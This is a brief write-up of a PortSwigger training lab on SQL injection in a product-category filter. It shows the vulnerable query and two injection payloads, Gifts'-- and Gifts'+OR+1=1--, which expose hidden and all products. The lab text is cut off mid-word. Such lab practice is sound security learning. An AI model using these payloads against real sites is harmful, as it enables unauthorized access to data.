
# SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:

```
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

To solve the lab, perform a SQL injection atta

---------------------------------------------

Reference: https://portswigger.net/web-security/sql-injection

---------------------------------------------

When the buttons are clicked it is filtered by category:



![img](images/SQL%20injection%20vulnerability%20in%20WHERE%20clause%20allowing%20retrieval%20of%20hidden%20data/1.png)

This is done with a GET request:



![img](images/SQL%20injection%20vulnerability%20in%20WHERE%20clause%20allowing%20retrieval%20of%20hidden%20data/2.png)

Using the following payload we get 4 items instead of only 3, because it shows both the released and the hidden one:

```
/filter?category=Gifts'-- 
```



![img](images/SQL%20injection%20vulnerability%20in%20WHERE%20clause%20allowing%20retrieval%20of%20hidden%20data/3.png)

To show all values we add OR 1=1 to display all categories:

```
/filter?category=Gifts'+OR+1=1--
```



![img](images/SQL%20injection%20vulnerability%20in%20WHERE%20clause%20allowing%20retrieval%20of%20hidden%20data/4.png)
